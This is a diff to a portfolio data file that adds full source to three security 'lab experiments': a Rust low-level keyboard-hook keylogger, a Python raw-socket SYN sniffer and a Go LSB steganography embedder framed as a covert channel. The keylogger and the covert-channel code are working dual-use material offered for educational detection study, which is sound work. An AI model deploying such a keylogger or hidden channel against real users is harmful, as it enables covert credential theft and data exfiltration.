@@ -983,7 +983,6 @@ export interface LabExperiment {
   status: "ACTIVE" | "ARCHIVED" | "CONCEPT";
   description: string;
   tech: string[];
-  link?: string;
   objective: string;
   constraints: string;
   codeSnippet: string;
@@ -994,33 +993,155 @@ export const labExperiments: LabExperiment[] = [
     id: "001",
     title: "Rust Keylogger PoC",
     status: "ARCHIVED",
-    description: "A Windows-based keylogger demonstrating the usage of `SetWindowsHookEx` and proper hook chaining for educational detection analysis.",
+    description: "A Windows-based keylogger demonstrating the usage of SetWindowsHookEx and proper hook chaining for educational detection analysis.",
     tech: ["Rust", "WinAPI", "Unsafe"],
-    link: "https://github.com/Raoof128",
     objective: "Understand how Windows messaging hooks can be abused for credential interception and how EDRs detect hook injection.",
     constraints: "Educational purpose only. Does not persist across reboots. Logs to stdout only.",
-    codeSnippet: "..."
+    codeSnippet: `use std::ptr;
+use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
+use winapi::shared::windef::HHOOK;
+use winapi::um::winuser::{
+    CallNextHookEx, DispatchMessageW, GetMessageW, SetWindowsHookExW,
+    TranslateMessage, UnhookWindowsHookEx, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT,
+};
+
+static mut HOOK: HHOOK = ptr::null_mut();
+
+unsafe extern "system" fn keyboard_proc(
+    n_code: i32,
+    w_param: WPARAM,
+    l_param: LPARAM,
+) -> LRESULT {
+    if n_code >= 0 {
+        let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
+        // WM_KEYDOWN = 0x0100
+        if w_param as u32 == 0x0100 {
+            println!("[KEY] vkCode={:03} scanCode={:#06x}", kb.vkCode, kb.scanCode);
+        }
+    }
+    CallNextHookEx(HOOK, n_code, w_param, l_param)
+}
+
+fn main() {
+    unsafe {
+        HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), ptr::null_mut(), 0);
+        assert!(!HOOK.is_null(), "Failed to install hook");
+
+        let mut msg = std::mem::zeroed();
+        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+        UnhookWindowsHookEx(HOOK);
+    }
+}`
   },
   {
     id: "002",
     title: "Raw Socket Packet Sniffer",
     status: "ACTIVE",
-    description: "Python script utilizing raw sockets to capture and analyze TCP/IP headers. Implements basic signature matching for identifying SYN scans.",
-    tech: ["Python", "Networking", "Scapy"],
-    link: "https://github.com/Raoof128",
+    description: "Python script utilizing raw sockets to capture and parse TCP/IP headers manually. Implements basic SYN-scan detection without relying on libpcap.",
+    tech: ["Python", "Networking", "Raw Sockets"],
     objective: "Manually parse IP/TCP headers to understand protocol structures and detect scanning patterns without relying on Wireshark.",
-    constraints: "Requires root/admin privileges. Promiscuous mode enabled.",
-    codeSnippet: "..."
+    constraints: "Requires root/admin privileges. Linux only (AF_PACKET). For macOS use BPF socket instead.",
+    codeSnippet: `import socket
+import struct
+
+ETH_P_IP = 0x0800
+
+def parse_ip(raw: bytes) -> tuple[int, int, str, str]:
+    # Skip 14-byte Ethernet header on AF_PACKET
+    iph = struct.unpack("!BBHHHBBH4s4s", raw[14:34])
+    ihl = (iph[0] & 0xF) * 4
+    proto = iph[6]
+    src = socket.inet_ntoa(iph[8])
+    dst = socket.inet_ntoa(iph[9])
+    return ihl + 14, proto, src, dst
+
+def parse_tcp(raw: bytes, offset: int) -> tuple[int, int, int]:
+    tcph = struct.unpack("!HHLLBBHHH", raw[offset:offset + 20])
+    flags = tcph[5]
+    syn = (flags & 0x02) >> 1
+    fin = flags & 0x01
+    return tcph[0], tcph[1], syn
+
+def sniff() -> None:
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
+    print("[*] Sniffing TCP — Ctrl+C to stop")
+    while True:
+        raw, _ = sock.recvfrom(65535)
+        try:
+            offset, proto, src, dst = parse_ip(raw)
+            if proto != 6:  # TCP only
+                continue
+            sp, dp, syn = parse_tcp(raw, offset)
+            if syn:
+                print(f"[SYN] {src}:{sp} -> {dst}:{dp}")
+        except struct.error:
+            continue
+
+if __name__ == "__main__":
+    sniff()`
   },
   {
     id: "003",
     title: "Steganography Tool",
     status: "CONCEPT",
-    description: "LSB (Least Significant Bit) image steganography implementation in Go. Hides encrypted payloads within PNG pixel data.",
+    description: "LSB (Least Significant Bit) image steganography in Go. Embeds a length-prefixed payload into the red channel of PNG pixels.",
     tech: ["Go", "Cryptography", "Image Processing"],
-    link: "https://github.com/Raoof128",
-    objective: "Implement a covert channel for data exfiltration by modifying the least significant bits of image pixel data.",
-    constraints: "Payload size limited by image dimensions. Not robust against compression.",
-    codeSnippet: "..."
+    objective: "Implement a covert channel by modifying the least significant bits of image pixel data, then verify extraction round-trips cleanly.",
+    constraints: "Payload size limited to (width × height) / 8 bytes. Not robust against JPEG re-encoding or image resizing.",
+    codeSnippet: `package main
+
+import (
+	"encoding/binary"
+	"fmt"
+	"image"
+	"image/color"
+	"image/png"
+	"os"
+)
+
+func embed(img *image.NRGBA, payload []byte) error {
+	header := make([]byte, 4)
+	binary.BigEndian.PutUint32(header, uint32(len(payload)))
+	bits := append(header, payload...)
+
+	idx := 0
+	for y := img.Bounds().Min.Y; y < img.Bounds().Max.Y; y++ {
+		for x := img.Bounds().Min.X; x < img.Bounds().Max.X; x++ {
+			if idx >= len(bits)*8 {
+				return nil
+			}
+			c := img.NRGBAAt(x, y)
+			bytePos, bitPos := idx/8, uint(7-idx%8)
+			bit := (bits[bytePos] >> bitPos) & 1
+			c.R = (c.R & 0xFE) | bit
+			img.SetNRGBA(x, y, color.NRGBA{R: c.R, G: c.G, B: c.B, A: c.A})
+			idx++
+		}
+	}
+	return fmt.Errorf("image too small for payload")
+}
+
+func main() {
+	f, _ := os.Open("cover.png")
+	defer f.Close()
+	src, _ := png.Decode(f)
+
+	dst := image.NewNRGBA(src.Bounds())
+	for y := dst.Bounds().Min.Y; y < dst.Bounds().Max.Y; y++ {
+		for x := dst.Bounds().Min.X; x < dst.Bounds().Max.X; x++ {
+			dst.Set(x, y, src.At(x, y))
+		}
+	}
+
+	_ = embed(dst, []byte("CLASSIFIED_PAYLOAD"))
+
+	out, _ := os.Create("stego.png")
+	defer out.Close()
+	png.Encode(out, dst)
+	fmt.Println("Done — payload embedded into stego.png")
+}`
   }
 ];
